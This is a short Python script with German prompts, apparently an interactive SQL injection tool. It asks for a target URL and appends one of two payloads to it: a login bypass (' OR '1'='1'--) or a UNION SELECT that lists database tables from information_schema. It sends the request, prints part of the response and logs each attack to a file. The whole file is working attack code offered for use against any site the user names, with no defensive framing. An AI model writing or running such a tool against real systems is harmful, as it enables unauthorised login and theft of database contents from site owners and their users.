import requests
from datetime import datetime

def exploit_sql_injection():
    """Führt SQL-Injection-Exploits aus"""
    target = input("🎯 Ziel-URL (z.B. 'http://test.com/login.php?user='): ")
    print("\n[💉 Wähle Exploit:]")
    print("1: Login-Bypass")
    print("2: Datenbank auslesen")
    
    choice = input(">>> ")
    
    if choice == "1":
        payload = "' OR '1'='1'--"
    elif choice == "2":
        payload = "' UNION SELECT 1,table_name,3 FROM information_schema.tables--"
    else:
        print("❌ Ungültige Option!")
        return

    try:
        response = requests.get(target + payload)
        print(f"Antwort ({len(response.text)} Zeichen): {response.text[:100]}...")
        with open("../logs/attacks.log", "a") as f:
            f.write(f"[{datetime.now()}] SQLi auf {target} mit {payload}\n")
    except Exception as e:
        print(f"Fehler: {e}")
